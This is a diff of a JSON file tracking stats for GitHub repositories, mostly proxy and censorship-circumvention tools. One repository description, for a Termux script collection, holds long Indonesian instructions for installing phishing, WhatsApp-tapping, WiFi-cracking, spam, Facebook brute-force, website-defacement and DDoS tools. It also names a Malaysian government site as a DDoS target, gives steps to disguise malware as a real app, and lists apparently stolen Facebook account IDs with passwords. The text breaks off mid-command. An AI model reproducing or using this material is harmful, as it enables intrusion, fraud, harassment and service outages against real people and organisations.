@@ -3,7 +3,7 @@
     "full_name": "mack-a/v2ray-agent",
     "html_url": "https://github.com/mack-a/v2ray-agent",
     "description": "Xray、Tuic、hysteria2、sing-box 八合一一键脚本",
-    "stars": 22518,
+    "stars": 22527,
     "forks": 5563,
     "language": "Shell",
     "topics": [
@@ -36,8 +36,8 @@
     "full_name": "yonggekkk/Cloudflare-vless-trojan",
     "html_url": "https://github.com/yonggekkk/Cloudflare-vless-trojan",
     "description": "CF-workers/pages代理脚本：支持Vless-ws(tls)、Trojan-ws(tls)；Socks5/http本地代理脚本：可选ECH-TLS、普通TLS、无TLS三种代理模式",
-    "stars": 16840,
-    "forks": 9907,
+    "stars": 16843,
+    "forks": 9903,
     "language": "JavaScript",
     "topics": [
       "argo",
@@ -59,14 +59,14 @@
     ],
     "created_at": "2023-07-22T05:43:42Z",
     "pushed_at": "2026-09-20T01:59:29Z",
-    "growth": 5
+    "growth": 3
   },
   {
     "full_name": "jinwyp/one_click_script",
     "html_url": "https://github.com/jinwyp/one_click_script",
     "description": "install latest or LTS linux kernel and enable BBR or BBR plus",
     "stars": 5136,
-    "forks": 1383,
+    "forks": 1382,
     "language": "Shell",
     "topics": [
       "acme",
@@ -92,7 +92,7 @@
     ],
     "created_at": "2020-05-11T07:48:15Z",
     "pushed_at": "2026-10-29T04:22:42Z",
-    "growth": 1
+    "growth": 0
   },
   {
     "full_name": "cirosantilli/china-dictatorship",
@@ -125,13 +125,13 @@
     ],
     "created_at": "2015-04-02T20:51:50Z",
     "pushed_at": "2026-02-05T07:59:11Z",
-    "growth": 6
+    "growth": 0
   },
   {
     "full_name": "amclubs/am-cf-tunnel",
     "html_url": "https://github.com/amclubs/am-cf-tunnel",
     "description": "这是一个基于 Cloudflare Workers 和 Pages平台的脚本,通过EDtunnel修改，使用该脚本可以自动生成VLESS、Trojan免费节点,并配置信息使用在线配置转换到 Clash、 Singbox 、Quantumult X等工具中。",
-    "stars": 3175,
+    "stars": 3176,
     "forks": 2251,
     "language": "JavaScript",
     "topics": [
@@ -146,7 +146,7 @@
     ],
     "created_at": "2024-10-13T06:14:45Z",
     "pushed_at": "2026-10-05T14:57:23Z",
-    "growth": 0
+    "growth": 1
   },
   {
     "full_name": "gege-circle/.github",
@@ -167,7 +167,7 @@
     ],
     "created_at": "2020-09-20T04:47:25Z",
     "pushed_at": "2025-10-04T07:56:18Z",
-    "growth": 1
+    "growth": 0
   },
   {
     "full_name": "fscarmen/ArgoX",
@@ -198,15 +198,15 @@
       "xray"
     ],
     "created_at": "2023-02-16T09:29:16Z",
-    "pushed_at": "2026-11-21T01:50:54Z",
-    "growth": 2
+    "pushed_at": "2026-11-28T01:53:48Z",
+    "growth": 0
   },
   {
     "full_name": "xmwengxing/CFPilot",
     "html_url": "https://github.com/xmwengxing/CFPilot",
     "description": "Cloudflare Workers 代理微内核 · 真连接优选面板 · 一键部署（VLESS/Trojan/XHTTP + 优选订阅 + 本地真连接优选器 + 中文部署向导）",
-    "stars": 1691,
-    "forks": 635,
+    "stars": 1824,
+    "forks": 665,
     "language": "TypeScript",
     "topics": [
       "cloudflare",
@@ -220,15 +220,15 @@
       "xhttp"
     ],
     "created_at": "2026-10-21T07:31:49Z",
-    "pushed_at": "2026-11-26T23:50:52Z",
-    "growth": 192
+    "pushed_at": "2026-11-28T09:29:08Z",
+    "growth": 133
   },
   {
     "full_name": "yonggekkk/Doprax-Xray",
     "html_url": "https://github.com/yonggekkk/Doprax-Xray",
     "description": "Doprax一键五协议共存脚本：Xray内核，支持vless，vmess，trojan，shadowsocks，socks五协议同时在线，支持Cloudflare Argo隧道自动生成分享链接",
     "stars": 1395,
-    "forks": 4973,
+    "forks": 4972,
     "language": "Shell",
     "topics": [
       "cloudflare-argo-tunnel",
@@ -250,7 +250,7 @@
     "html_url": "https://github.com/GFW4Fun/x-ui-pro",
     "description": "XUI-PRO nginx reverse proxy with ws/grpc/httpupgrade/splithttp,xray protocol support: vless,vmess,trojan,shadowsocks panel cloudflare ssl,xtls,ssr,v2fly,v2ray installer bypass restrictions sing-box,shadowtls,reality,tunnel,gfw tor warp wireguard geoip tuic clash vpn mihomo psiphon hy2 oneclick argo bbr wstunnel anticensorship⚡🛡️",
     "stars": 1334,
-    "forks": 358,
+    "forks": 359,
     "language": "Shell",
     "topics": [
       "argosbx",
@@ -282,7 +282,7 @@
     "html_url": "https://github.com/amclubs/am-cf-tunnel-sub",
     "description": "基于Vercel、Cloudflare 部署该脚本，你可以方便地将Cloudflare Workers 和 Pages的 VLESS、Trojan 配置信息使用在线配置转换到 Clash、 Singbox 、Quantumult X等工具中订阅使用。Cloudflare Workers 和 Pages 生成VLESS、Trojan节点,实现一键订阅节点。",
     "stars": 1235,
-    "forks": 1360,
+    "forks": 1359,
     "language": "JavaScript",
     "topics": [
       "clash",
@@ -305,7 +305,7 @@
     "html_url": "https://github.com/ca110us/epeius",
     "description": "WebSocket-to-TCP forwarding on Cloudflare Workers using the Trojan protocol.",
     "stars": 1221,
-    "forks": 5806,
+    "forks": 5805,
     "language": "-",
     "topics": [
       "cloudflare-workers",
@@ -318,13 +318,13 @@
     ],
     "created_at": "2024-05-04T05:12:17Z",
     "pushed_at": "2026-11-02T16:26:13Z",
-    "growth": 1
+    "growth": 0
   },
   {
     "full_name": "Leadaxe/LxBox",
     "html_url": "https://github.com/Leadaxe/LxBox",
     "description": "L×Box — Android VPN client for VLESS, REALITY, XHTTP, Cloudflare WARP, Tailscale and AmneziaWG, powered by a sing-box fork",
-    "stars": 801,
+    "stars": 802,
     "forks": 46,
     "language": "Dart",
     "topics": [
@@ -350,31 +350,31 @@
       "xhttp"
     ],
     "created_at": "2026-04-11T19:58:53Z",
-    "pushed_at": "2026-11-26T17:01:21Z",
-    "growth": 5
+    "pushed_at": "2026-11-28T03:23:42Z",
+    "growth": 1
   },
   {
     "full_name": "landy22granatt/Kumpulan-Script-Termux",
     "html_url": "https://github.com/landy22granatt/Kumpulan-Script-Termux",
     "description": "Ok, Langsung Saja Ke Materi. Sesuai Judul, Disini Saya Akan Memberikan Kumpulan Script Termux Yang Masih Work. Karena, Jarang Sekali Saat Ini Mendapatkan Script Yang Benar-Benar Work.  ✓BOT KOMEN DAN LIKE INSTAGRAM $ pkg update $ pkg upgrade $ pkg install python2 $ pkg install ruby $ gem install lolcat $ pkg install git $git clonehttps://github.com/Hanzelnutt/instabot $ cd instabot $ ls $ pip2 install -r requirements.txt $ bash instabot  ✓PHISING AKUN GMAIL $apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher  2. EXPLOIT  ✓SADAP WHATSAPP $ pkg install git python2 $ git clone https://github.com/Bl4ckDr460n/HxWhatsApp $ cd HxWhatsapp $chmod +x HxWhatsApp $ python2 HxWhatsApp.py  ✓CONNECT WIFI TANPA PASWORD $apt update && apt upgrade $pkg install git $git clone https://github.com/esc0rtd3w/wifi-hacker $cd wifi-hacker/ $chmod +x wifi-hacker.sh $./wifi-hacker.sh  ✓MELACAK LOKASI Script ini menggunakan alamat IP untuk melacak koordinat target. $apt update $apt upgrade $pkg install python git $git clonehttps://github.com/maldevel/IPGeoLocation $cd IPGeoLocation $chmod +x ipgeolocation.py $pip install -r repuirements.txt $python ipgeolocation.py -m $python ipgeolocation.py -h $python ipgeolocation.py -t 10.99.110.220  Ubah alamat IP yang berwarna kuning dengan alamat IP dari orang yang ingin dilacak. Kemudian copas semua koordinat mulai dari https:// ke browser kalian. *✓DEFACE'  Deface merupakan kata dari bahasa ingris yang artinya merusak, mengotori, mencoreng, dan menghapus. Namun dalam dunia hacker deface adalah kegiatan hacking dengan merubah tampilan suatu website. Baik halaman utama maupun halaman yang terkait dalam suatu url. $apt update && apt upgrade $apt install python2 openssl curl libcurl $pip2 install urllib3 chardet certifi idna requests $mkdir webdav $cd webdav $wget https://pastebin.com/raw/HnVyQPtR $mv HnVyQPtR webdav.py $chmod +x webdav.py  ✓SPAM SMS $pkg install php curl $pkg install curl $curl https://pastebin.com/raw/9BYy1JVc -o jdid.php $php jdid.php  ✓SPAM CALL (TOKOPEDIA) $apt update && apt upgrade $pkg install php $pkg install git $git clone https://github.com/storiku/Call $cd Call $php spamcall.php  Lalu masukan no hp korban  ✓SC TROJAN (TARGET) $pkg update & pkg upgrade $pkg install git $git clone https://github.com/4L13199/meTAInstall $cd meTAInstall $chmod +x meTAInstall $sh meTAInstall.sh 3.TOOL INSTALLER Tools installer adalah tools yang digunakan untuk menginstal banyak script. Biasanya tools installer dapat menginstal 200-300 script.  ✓TOOLS SCORPION $git clone https://github.com/ScorpRx/ScorpRx-Tools $cd ScorpRx-Tools $chmod +x ScorpRx-Tools.sh $sh ScorpRx-Tools.sh  ✓TOOLS NETHUNTER $apt update $apt install git $git clone https://github.com/Hax4us/Nethunter-In-Termux.git $cd Nethunter $chmod +x kalinethunter $./kalinethunter $./startkali.sh  ✓TOOLS LAZYMUX $pkg update && upgrade $pkg install python2 git $git clone https://github.com/Gameye98/Lazymux $cd Lazymux $chmod +x lazymux.py $python2 lazymux.py  ✓TOOLS DAIJOBU $apt upgrade && apt update $apt install php git $git clone https://github.com/alintamvanz/diejoubu $cd diejoubu $cd v1.2 $php diejoubu.php  ✓TOOLS B4J1N94N $git clonehttps://github.com/DarknessCyberTeam/B4J1N64Nv5 $cd B4J1N64Nv5 $sh B4J1N64N.sh  *4. DDOS DDOS attack adalah singkatan dari distributed denial of services yang berfungsi untuk membuat suatu server komputer menjadi tidak bisa dipakai oleh user-nya, dengan menggunakan ribuan system yang menyerang secara bersamaan.  ✓HAMMER $pkg update && pkg upgrade $pkg install python git $git clone https://github.com/cyweb/hammer $cd hammer $python hammer.py $python hammer.py -s [IP target] -p [PORT] -t 135  ✓LUCINTA DDOS $ apt update && napt upgrade $ apt install python $ apt install git $ git clone https://github.com/zlucifer/lucita_ddos $ cd lucita_ddos $ chmod +x pukul.py $ python pukul.py  ✓DDOS TROJAN $ pkg update && pkg upgrade $ pkg install python $ pkg install bash $ pkg install toilet $ pkg install lolcat $ pkg install git $ git clone https://github.com/MrTamfanX/MrDdos $ cd MrDdos $ sh Tamfan-Ddos.sh  ✓Win 32DDOS ATTACK $ apt upgrade&&apt update $ apt install git toilet $ apt install python $ apt install python2 $ git clone https://github.com/banghyuu/ddosWD ‌$ cd ddosWD $ sh Ddos.sh  √XERXES ‌$ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80  √TORSHAMMER $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls $ cd torshammer $ chmod +x torshammer.oy $ python2 torshammer.py  ✓VANESSA ANGGEL DDOS $ pkg update && pkg upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/MiSetya/VA-DDOS $ cd VA-DDOS $ ls $ chmod +x 80juta.py $ ls $ python2 80juta.py  ✓DDOS BY.BLACKCYC $pkg install git $git clone https://github.com/BlackCyberAnonim/B-ATTACKING $cd B-ATTACKING $ls $sh install.Sh  Virtex for Whatsapp  apt update && apt upgrade  apt install git  apt install curl  apt install figlet  apt install ruby  gem install lolcat  git clone https://github.com/muhammadfathul/VIRTEX  cd VIRTEX  chmod +x virtex.sh  sh virtex.sh  ⚔TOOLS HACK VIA TERMUX⚔  🔰TOOLS HACK FB TEMAN🔰 Versi Terbaru Cracknya Lbh Cepat  $ apt update && apt upgrade $ pip2 install --upgrade pip $ pip2 install requests $ pip2 install mechanize $ pkg install git $ git clone https://github.com/blackcodercrush/hack-facebook-teman $ cd hack-facebook-teman $ sh requests.sh $ python2 hack-fb.py _______________  🔰Hack Facebook target 🔰  $ apt update && apt upgrade $ apt install git $ apt install python2 $ pip2 install mechanize $ git clone https://github.com/FR13ND8/BRUTEFORCEnew $ cd BRUTEFORCEnew $ sh new.sh _______________ 🔰Hack ig🔰  $ pkg install nano $ pkg install figlet  $ pkg install python2 $ pip2 install lolcat  $ pkg install cowsay $ pkg install git $ git clone https://github.com/darkcurut08/darkcurut08 $ cd darkcurut08 $ sh Moreno77.sh _______________  🔰Hack Facebook Terbaru🔰  $ apt update && apt upgrade $ pkg ins toilet $ pkg ins figlet $ pkg ins ruby $ pkg ins gem $ gem ins lolcat $ pkg ins php $ pkg ins python2 $ pkg ins git $ git clone https://github.com/Rusmana-ID/rus, $ cd rus $ sh v2.sh  rename: Anak pw: Bangsa _______________ 🔰TOOLS SADAP🔰  $ apt update && apt upgrade $ apt install php git $ apt install bash $ git clone https://github.com/MrTamfanX/TamfanFacebook $ cd TamfanFacebook $ chmod +x * $ chmod -R 775 lib $ sh install.sh $ sh tamfan.sh _______________ 🔰DDos Attack WI-FI🔰  $ apt update && apt upgrade $ apt install python2 $ apt install git $ $ cd LITEDDOS  Cek:https://ipsaya.com/hostinglokasi.php  $ python2 LITEDDOS.py [IP target] 80 100 _______________ 🔰DDos Attack HP Orang 🔰  $ apt update && apt upgrade $ pkg install python2 $ pip2 install mechanize $ pip2 install request $ pkg install git $ git clone https://github.com/R133F/Trojans $ cd Trojans $ python2 trojans.py   DDOS WiFi nya masih work  Hack Fb Target New  ------------------------------------------  pkg install git pkg install python2 pip2 install --upgrade pip pip2 install mechanize git clone https://github.com/MRA27/FBNEWV2 cd FBNEWV2 python2 MRA27.py 100003191711187   apt update && apt upgrade apt install php apt install python2 apt install toilet apt install git git clone https://github.com/4L13199/LITESPAM cd LITESPAM sh LITESPAM.sh  Oke langsung saja ke penginstalannya..  $ apt update && apt upgrade $ apt install git $ apt install php $ apt install figlet $ apt install toilet $ apt install python2 $ pip2 install requests $ pip2 install termcolor $ git clone https://github.com/DarknessCyberTeam/BAJINGANv6.git $ cd BAJINGANv6 $ sh BAJINGAN.sh Masukkan Username Ini username : BAJINGAN Masukkan Password Ini password :  Gans Kumpulan Tools By InYourG00D Izin promosi biar laku ea  Nuub Numpang Lewat  Silahkan Cek https://github.com/InYourG00D1 Disitu Ada Tools Bermanfaat :V Work gk? lu cobain aja   ÷Kumpulan Kode Unik fb÷ $ pkg install update && pkg install upgrade $ apt install toilet $ apt install figlet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Unix $ cd Unix $ sh KD-FB.sh  ÷Tools Check BIN÷ $ pkg install update & pkg install upgrade $ pkg install git $ git clone https://github.com/InYourG00D1/check $ cd check $ php bin.php  ÷Tools Spam bom÷ Vitur  1.Spam bom Bukalapak 2.Spam bom JD-ID 3.Spam Bom PHD 4.Spam Bom Tokoped 5.Spam Bom Hooq 6.Spam Bom KFC 7.Spam bom matahari _Totur nya _ $ pkg install update && pkg install upgrade $ pkg install toilet $ pkg install figlet $ pkg install lolcat $ pkg install php $ pkg install python2 $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Spam $ cd Spam $ sh ms.sh  ÷Kuota free Khusus Tree÷ $ pkg install update && pkg install upgrade $ apt install toilet $ apt install figlet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/KuotaFree $ cd KuotaFree $ sh 2.sh  ÷Pulsa Free work100%÷ $ pkg update&&pkg upgrade $ pkg install toilet $ gem install lolcat $ git clone https://github.com/InYourG00D1/PulsaFree $ ls $ cd PulsaFree $ sh Free.sh  ÷Tools Sc Phising All Game÷ Tapi gk semua game juga si :V $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/ScPh1s1ng $ cd ScPh1s1ng $ sh 6.sh  ÷Kumpulan shell & sc pepes÷ Kalo Ingin Direcode scnya silahkan Hak cipta Jangan Dirubah Hargai mereka coding gan Ngecoding Gk Segampang Dapettin Cinta Kamu $ pkg install update && pkg install upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Pepescers $ cd Pepescers $ sh MTD.sh  ÷Tools ngubah Vidmax jadi Flash÷ Work 100% dicoba aja gan $ pkg install update $ pkg install upgrade $ apt install php $ pkg install git $ git clone https://github.com/InYourG00D1/Flash $ cd Flash $ php flash.php  ÷Tools Nuyul GoPay÷ $ pkg install update $ pkg install upgrade $ apt install php $ pkg install git $ git clone https://github.com/InYourG00D1/Nuyul-GoPay $ cd Nuyul-GoPay $ php Go-Pay.php  ÷Tools Install Bkp÷ Yg punya Kontol BuKan Lu doang Bwahaha Proses Install nya lumayan lama :V Kalo Mau Cepet Cari Ea Sono  $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/TumbalGanss/ToolsBkp $ cd ToolsBkp $ sh Tobat.sh  ÷Tools Installer÷ 200 tools  $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/InstallPlerN2 $ cd InstallPlerN2 $ sh InstallPlerV2.sh  ÷Tools Script Phising All÷ game,FB,Instagram $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/scPH1S1N9 $ cd scPH1S1N9 $ sh PhisingV2.sh  #shareMhank #nomor Yg ada Di Tools Udh Gk Aktif #Ini New Nomer nya : 0895805133060  https://chat.whatsapp.com/Cj0VpOmWpQBJUEQZqqOLn3  [+] Site Title: MyGOV - The Government of Malaysia's Official Portal [+] IP address: 150.242.182.57 [+] Web Server: Apache [+] CMS: Could Not Detect [+] Cloudflare: Not Detected [+] Robots File: Could NOT Find robots.txt!  TARGET IP=150.242.182.57  PORT:80   TARGET WEB=malaysia.gov.my   HARI INI 16-APRIL-2019 JAM 15.00 WIB   TOOL ATTACK?  -=NEW TOOL=- ================= Win32 attack ================= apt install git apt install python apt install bash apt install toilet apt install lolcat git clone https://github.com/BPCATTACKER/DOS-TOOKITS cd DOS-TOOKITS sh DoS-TOOKIT.sh  APA YG BARU? -PERBAIKAN ERROR SAAT MENGIRIM PACKET ATTACK -DLL  ================ DDOS BPC http://github.com/BLACK-PHANTOM-CYBER/DDOS-BPC/ cd DDOS-BPC python2 SPOONDDOS.sh =================== Ingat sebelum attack harus cek ip dulu karena ip bisa berubah-ubah Dgn cara Ketik di termux  ping malaysia.gov.my  Salam NASIONAL CYBER ASOSSIATION   LEBIH BAIK MENCOBA DAN GAGAL DARI PD TIDAK MENCOBA SAMA SEKALI   YG SEBAR GW DOAIN DAPAT PAHALA DAPAT PAHALA  Spam Call Unlimited $ pkg update && pkg upgrade $ pkg install php $ pkg install git $ git clone https://github.com/Aditya021/SpamCall $ cd SpamSms $ php SpamCall.php Masukan No Target ===> Mode Banyak (y/n) ===> UNTUK Spam Lebih Dari 1 JumlahSpam ===> Masukan Jumlah yang ingin dispam🙏🙏🙏🎭🎭🇲🇨  Siapa tau ada yang mau nih sc Cara install tool Mr.Rv1.1 $apt update && apt upgrade $pkg install git $pkg install gem $pkg install figlet $gem install lolcat $git clone https://github.com/Mr-R225/Mr.Rv1.1 $cd Mr.Rv1.1 $sh Mr.Rv1.1.sh  tool install $ apt update && apt upgrade $ apt install git $ git clone https://github.com/aryanrtm/4wsectools cd 4wsectools chmod 777 tools ./tools  TOOL FSOCIETY $ git clone https://github.com/manisso/fsociety $ cd fsociety $ ./install.sh $ ls $ python2 fsociety.py  Assalamualaikum wr.wb Ni gw bagi SC DARK-FB(VIP-VPRO) & Gw bagi2 akun FB untuk kalian   Ni scripst HACK FB NEWW  (VIP.VPRO) NO LISENSI ∞∞∞≠BY MR.M4RCH3LL≠∞∞∞  $ pkg update && pkg upgrade $ pkg install git $ pkg install python2 $ pkg install mechanize $ pkg install request $ git clone https://github.com/m4rche3ll-cyber/dark-vpro $ cd dark-vpro $ python2 dark-vpro.py  NI akun FB untuk kalian smua  [OK✓] 100037694627558 \\| Syla12345 [✓] 100037988325303 \\| Feri123 [✓] 100037977879771 \\| Rifaa123  [OK✓] 100037091885666 \\| Sutris12345 [OK✓] 100037229983265 \\| Kahfi123  [OK✓] 100037166443432 \\| Munir123 [OK✓] 100037216997895 Nawawi123 [OK✓] 100037665398302 \\| Ponatim123 [OK✓] 100037974392506 \\| Andri123 [OK✓] 100037679447951 \\| Andika123 [✓] 100037946790741 \\| Sutres123 [✓] 100038002561349 \\| Aghni123 [✓] 100038113410131 \\| Blaster123 [✓] 100037710525968 \\| Noffal123 [✓] 100037988325303 \\| Feri123 [✓] 100037590739244 \\| Agus123 [✓] 100037576672206 \\| Kenyot123 [✓] 100037974392506 \\| Andri123 [OK✓] 100037714800465 \\| Dafa123 [OK✓] 100037869518631 \\| Ervan123 [OK✓] 100037354215333 Tans12345 [OK✓] 100037553282746 \\| Rifal123 [OK✓] 100037114456712 \\| Afif12345 [OK✓] 100037388647024 \\| Doni123 OK✓] 100037155800753 \\| Ikna123 [OK✓] 100037360233177 \\| Udin123 [OK✓] 100037089379481 \\| Dafa123 [OK✓] 100037388887005 Ridwan123 OK✓] 100037199269083 \\| Rifki123 [OK✓] 100037446305432 \\| Bima123  Gunakan dengan bijak !!!  Kalau kalian ingin tanya lebih / ada masalah Kalian bisa wa saya  No wa ADA DI SC NYA/ komen di bawah  Jangan lupa SUBSCRIBE (FREE) ,agar channel ini berkembang ,,& juga we akan membuat sc2 yang bermanfaat bagi kalian semua   Link grup wa : https://chat.whatsapp.com/KxTHh6xi9OgEEl41UDURE9  Oke , terimakasih:)  Wassalamu'alaikum wr.wb    Aldaynoobz  Selasa, 23 April 2019  Script-Termux                        We are anonymous                            We are legion                        We do not forgive                         We do not forget                                Expect us   ￼     DDOS ATTACK (TROJAN)  $ apt install git $ apt install python $ apt install bash $ apt install toilet $ apt install lolcat $ git clone https://github.com/BPCATTACKER/DOS-TOOKITS $ cd DOS-TOOKITS $ sh DoS-TOOKIT.sh  pilih no 1 lalu enter, lalu masukkan ip target dan enter attack sedang berjalan!  DDOS ATTACK  $  pkg update $  pkg upgrade $  pkg install python $  pkg install git $  git clone https://github.com/cyweb/  hammer $  cd hammer $  python hammer.py $  python3 hammer.py -s(ipnya cari sendiri di IP CHACKER) -p 80 -t 135   BOBOL-WIFI( root)  $ apt update && apt upgrade $ pkg install git $ git clone https://github.com/esc0rtd3w/wifi-hacker $ cd wifi-hacker/ $ chmod +x wifi-hacker.sh $ ./wifi-hacker.sh   HACK CCTV $ pkg update  $ pkg upgrade -y  $ pkg install python2 $ pkg install git  $ git clone https://github.com/GUNAWAN18ID/cctv.git  $ pip2 install requests  $ cd cctv  $ python2 scanner.py   SPAM CALL   $ pkg update $ pkg upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/MRRUXHANTAC270/RUXH4N_SPAM $ cd RUXH4N_SPAM $ python2 RUXH4N_SP4M.py8  Pilih nomor target jangan lupa pake (+62) ===>> +6285xxxxx Pilih jumlah spam ====>>>misal:100 Done :v  DEFACE WEBDAV  $  pkg update && pkg upgrade $  pkg install bash $  pkg install git $  pip2 install termocolor $  pip2 install lolcat $  git clone https://github.com/MRRUXHANTAC270/Deface-W3BD4F $  cd Deface-W3BD4F $  sh Webdav.sh  Masukan script html     Lalu pilih web vulnya >:)                  Cek               👇🏻👇🏻👇🏻  $apt install python2 $apt install git $apt install php $apt install bash $apt install nano $apt install toilet $git clone https://github.com/MRRUXHANTAC270/cek $cd cek $ls $sh cek.sh  HACK FACEBOOK TARGET  $pkg update && pkg upgrade $pkg install python2 $pkg install git $git clone https://github.com/MRRUXHANTAC270/Facebook-target $cd Facebook-target $python2 fb.py  SILAHKAN DOWNLOAD WORD LIST NYA TERLEBIH DAHULU https://sfile.mobi/4UugtYlifYk  Masukin id target ...  Lalu klik /sdcard/password.txt  SCRIPT DEFACE  $apt update && apt upgrade $apt install python2 $apt install git $apt install php $apt install bash $apt install nano $apt install toilet $git clone https://github.com/MRRUXHANTAC270/scriptdeface $  cd scriptdeface $  python2 now.py  SPAM WHATSAPP  $  apt update && apt upgrade $  apt install python2 $  apt install git $  apt install php $  apt install bash $  git clone https://github.com/MRRUXHANTAC270/sp4m $  cd sp4m $  php wa.php   Memper Cantik/Melihat V.Android Termux $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ gem install lolcat  $ cd ../usr/etc $ nano bash.bashrc cowsay -f eyes Cyber \\| lolcat toilet -f standard Indonesia -F gay neofetch date \\| lolcat ✓ Hack FB rombongan $ apt update && apt upgrade $ pkg install python2 git $ pip2 install mechanize $ git clone http://github.com/pirmansx/mbf $ ls $ cd mbf $ python2 MBF.py ✓ Hack FB ngincer $ apt update ( Enter ) $ apt upgrade ( Enter ) $ apt install python2 ( Enter ) $ pip2 install urllib3 chardet certifi idna requests ( Enter ) $ apt install openssl curl ( Enter ) $ pkg install libcurl ( Enter ) $ ln /sdcard ( Enter )  $ cd /sdcard ( Enter ) $ python2 fbbrute.py ( Enter ) ✓ Hack Gmail $ apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher  Nih yang mau hack WiFi Khusus root $apt update $apt upgrade $apt install git $git clone https://github.com/esc0rtd3w/wifi-hacker $ls $cd wifi-hacker $ls $chmod +x wifi-hacker.sh $ls $./wifi-hacker.sh  cara uninstall tool termux  rm -rf toolsnya   Bermain moon-buggy $ pkg install moon-buggy $ moon-buggy  CHATTING VIA TERMUX irssi /connet irc.freenode.net /nick w3wandroid /join #modol   $ pkg install irssi $ irssi $ /connect chat.freenode.net $ /nick 1235 12345 di ganti sesuai nama/nick agan $ /join #XCAteam   PERKIRAAN cuaca curl http://wttr.in/ (lokasi)    Browsing di termux $ pkg install w3m $ w3m www.google.com Linknya bsa diubah   Telephone di termux $ pkg install termux-api $ termux-telephony-call nomornya   Menampilkan animasi kereta :v $ pkg install sl $ sl menampilkan ikon dan informasi sistem android $ pkg install neofetch $ neofetch  menampilkan teks dalam format ASCII $ pkg install figlet $ figlet masukin teksnya   MEMUTAR MUSIC DI YOUTUBE VIA TERMUX $ pip install mps_youtube $ pip install youtube_dl $ apt install mpv $ mpsyt $ /judul lagu Tinggal pilih lagu dengan mengetik nomornya  musikan di termux $ pkg install mpv  $ mpv/sdcard/lagu.mp3  /sdcard/ bisa di ganti sesuai letak music    CRACK PASSWORD HASH $ git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/ $ cd FHX-Hash-Killer $ python2 FHXHashKiller.py  $ git clone https://github.com/UltimateHackers/Hash-Buster $ cd Hash-Buster $ python2 hash.py  ASCII ART MAPS - pkg install update && upgrade - pkg install perl - git clone https://github.com/x-xsystm/maps.git - cd kaos - perl maps.pl - untuk Zoom tekan A - Password: (pejuang212)   CARA MENGHIAS TAMPILAN TERMUX $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ pkg install ncurses-utils $ pkg install ruby $ pkg install lolcat $ pkg install cowsay $ gem install lolcat $ nano .bashrc  clear blue='\\e[1;34m' green='\\e[1;32m' purple='\\e[1;35m' cyan='\\e[1;36m' red='\\e[1;31m' white='\\e[1;37m' yellow='\\e[1;33m' NOW=`date \"+%d.%m.%Y\"` TIME=`date \"+%H:%M\"` cowsay -f eyes *Welcome To MRCX hacking tool* \\| lolcat toilet -f standard \" *MRCX* \" -F gay neofetch echo \" Time : \" $TIME \\| lolcat date \\| lolcat echo echo Username : marcyber team \\| lolcat echo Hostname : @MRCX~#root_system \\| lolcat echo echo @localhost:~# \\| lolcat echo root@localhost:~$ \\| lolcat echo -e $green echo root@MRCX:~$   TUTORIAL MEMBUAT VIRUS SEPERTI APLIKASI ASLINYA  Tools yang dibutuhkan: APK Editor & tool vbug APK Editor bisa didownload di playstore Tool vbug https://www.mediafire.com/file/6hs6y71ryw10uvw/vbug.zip 1. Download tool vbugnya dulu 2. Taruh file tool vbug di luar folder pada memori internal 3. Buka termux lalu $ cd /sdcard 4. $ unzip vbug.zip 5. $ cd vbug 6. $ python2 vbug.py 7. Enter 8. Ketik 10 9. Ketik E 10. Aplikasi virusnya sudah jadi Setelah aplikasinya jad kita tinggal edit supaya mirip aslinya 1. Buka APK Editor 2. Klik Select an Apk File 3. Pilih aplikasi virus tadi 4. Klik full edit 5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan 6. Lalu klik files 7. Klik res/drawable 8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan Catatan: format logo harus .png 9. Ceklist logo yang kedua lalu replace 10. Pilih file logo yang mau dijadikan logo aplikasi agan 11. Back sampai home Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan kita 12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan 13. Klik build 14. Tunggu hingga selesai 15. Jadi deh  VBugMaker Termux -apt update && apt upgrade -apt install git -apt install python Donwload file ->http://upfile.mobi/YGwg8gQLuvv Pindah ke directory Next -unzip vbug.zip -mv vbug $HOME -cd vbug -ls -chmod +x vbug.py -python2 vbug.py #Done    BOOM SPAM DI TERMUX apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default aja  Spam bom mall $ pkg install update  $ pkg install upgrade $ pkg install wget $ pkg install php $ wget http://files-store.theprivat.ml/uploads/bom-mall.zip $ unzip bom-mall.zip $ cd bom-mall $ php run.php  (Install SpamTsel) $ pkg install curl  $ pkg install php  $ curl -s 